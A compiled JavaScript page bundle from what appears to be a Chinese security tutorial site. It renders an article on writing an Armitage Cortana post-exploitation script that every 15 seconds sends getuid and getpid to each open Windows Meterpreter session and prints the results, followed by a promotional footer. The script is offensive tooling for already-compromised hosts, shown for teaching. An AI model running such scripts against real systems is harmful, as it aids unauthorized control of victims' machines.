(window.webpackJsonp=window.webpackJsonp||[]).push([[311],{601:function(s,t,a){"use strict";a.r(t);var n=a(7),e=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"armitage使用cortana实现后渗透攻击"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#armitage使用cortana实现后渗透攻击"}},[s._v("#")]),s._v(" Armitage使用Cortana实现后渗透攻击")]),s._v(" "),t("p",[s._v("首先，我们创建一个后渗透脚本heartbeat.cna")]),s._v(" "),t("p",[s._v("内容如下:")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('on heartbeat_15s{\n    local(\'$sid\');\n    foreach $sid (session_ids()){\n        if(-iswinmeterpreter $sid && -isready $sid){\n            m_cmd($sid, "getuid");\n            m_cmd($sid, "getpid");\n            on meterpreter_getuid{\n                println(" $3 ");\n            }\n            on meterpreter_getpid{\n                println(" $3 ");\n            }\n        }\n    }\n}\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br")])]),t("p",[s._v("这个脚本中，我们使用了一个名为heartbeat_15s的函数。这个函数每隔15秒会重复执行一次。")]),s._v(" "),t("p",[s._v("函数local表示$sid是当前函数的一个局部变量。吓一跳foreach语句是一个队所有开放会话的循环遍历。以if开始的语句将会对每一个会话进行检查，检查内容为该会话类型是否为Windows Meterpreter控制，以及该会话是否可以进行交互并接受命令。")]),s._v(" "),t("p",[s._v("m_cmd函数使用$sid(会话ID)等参数和命令将命令发送给Meterpreter会话。接着，我们定义了一个meterpreter_形式的函数，意味着即将发送到Meterpreter会话的命令。这个函数将会打印sent命令的输出。")]),s._v(" "),t("p",[s._v("使用Cortana载入这个脚本，并对结果进行分析，如下图所示：")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128211935380.png",loading:"lazy"}})]),s._v(" "),t("p",[s._v("成功载入并执行这段脚本之后，每隔15秒就会显示目标系统的用户ID和当前使用进程的ID。")]),s._v(" "),t("h2",{attrs:{id:"写在最后"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),t("blockquote",[t("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);t.default=e.exports}}]);